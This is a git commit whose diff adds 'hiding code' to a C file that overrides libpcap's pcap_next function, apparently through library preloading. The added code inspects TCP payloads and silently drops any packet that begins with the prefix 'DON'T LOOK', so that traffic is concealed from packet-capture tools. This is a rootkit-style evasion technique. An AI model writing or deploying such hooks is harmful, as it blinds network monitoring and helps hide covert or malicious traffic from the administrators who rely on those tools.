bae9b7836b752e915071845f55954c2cc033bc1d
Amit Barzilai <amit.barzilai22@gmail.com>
2025-08-31 15:03:52 +0300

    Added hiding code

--- override/libpcap.c
+++ override/libpcap.c
@@ -1,15 +1,20 @@
-
+#include "frame_analysis.h"
+#include <netinet/tcp.h>
 #include <dlfcn.h>
 #include <pcap/pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <pcap.h>
+#include <string.h>
 
 static u_char *(*og_pacp_next)(pcap_t *, struct pcap_pkthdr *) = NULL;
+char secret_prefix[] = "DON'T LOOK";
 
 const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
 {
     u_char *packet;
+    u_char *payload;
+    struct tcphdr *tcp_hdr;
     printf("WRAPPED\n");
     if (!og_pacp_next)
     {
@@ -22,6 +27,17 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
     }
     packet = og_pacp_next(p, h);
 
+    if (!(tcp_hdr = find_tcp_segment(packet, h->len)))
+        // Not TCP
+        return packet;
+
+    if (!(payload = get_tcp_payload(tcp_hdr)))
+        // Couldn't extract payload
+        return packet;
+
+    if (strncmp((char *)payload, secret_prefix, packet + h->len - payload) == 0)
+        // Secret message found
+        return pcap_next(p, h);
 
     return packet;
 
